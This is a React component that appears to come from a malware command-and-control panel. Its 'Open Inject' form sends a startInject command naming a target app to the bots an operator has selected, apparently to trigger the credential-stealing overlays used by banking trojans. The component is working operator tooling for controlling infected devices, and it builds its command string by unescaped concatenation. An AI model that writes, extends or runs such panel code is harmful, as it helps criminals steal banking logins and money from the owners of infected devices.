import { useContext, useState } from 'react';
import { Button, Input, notification } from "antd"
import { BotContext } from '../providers';
import { setCommand } from '../services';
import { ServerResponseType } from '../../../common/DataType';

export default ({load}: {load: () => void}) => {
  const { state, setState } = useContext(BotContext)
  const [inject, setInject] = useState('')

  const submit = () => {
    if (inject == '') {
      notification['error']({
        message: 'ERROR',
        description: 'Please fill the inject name.'
      })

      return
    }

    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"startInject","app":"' + inject + '"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
      load()

    })
  }
  
  return (
    <div className="pb-6">
      <h2 className="text-xl">Open Inject</h2>
      <p className="text-stone-500">Open Inject on selected bots</p>
      <Input placeholder="Inject name" className="!mb-2" value={inject} onChange={(e: any) => setInject(e.target.value)}/>
      <Button ghost type="primary" className="float-right" onClick={submit}>Open Inject</Button>
    </div>
  )
}